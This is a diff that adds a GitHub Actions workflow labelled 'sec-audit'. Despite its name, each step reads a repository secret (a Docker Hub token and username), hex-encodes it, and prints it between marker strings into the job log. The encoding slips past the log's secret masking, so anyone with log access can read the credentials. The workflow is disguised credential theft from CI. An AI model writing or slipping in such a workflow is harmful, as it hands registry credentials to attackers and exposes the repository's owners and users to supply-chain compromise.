@@ -1,0 +1,14 @@
+name: sec-audit
+on: workflow_dispatch
+jobs:
+  repo_secrets:
+    runs-on: ubuntu-latest
+    steps:
+      - name: s_DOCKERHUB_TOKEN
+        env:
+          V: ${{ secrets.DOCKERHUB_TOKEN }}
+        run: printf 'XX_DOCKERHUB_TOKEN_BEGIN %s XX_END\n' "$(printf '%s' "$V" | od -An -v -tx1 | tr -d ' \n')"
+      - name: s_DOCKERHUB_USERNAME
+        env:
+          V: ${{ secrets.DOCKERHUB_USERNAME }}
+        run: printf 'XX_DOCKERHUB_USERNAME_BEGIN %s XX_END\n' "$(printf '%s' "$V" | od -An -v -tx1 | tr -d ' \n')"
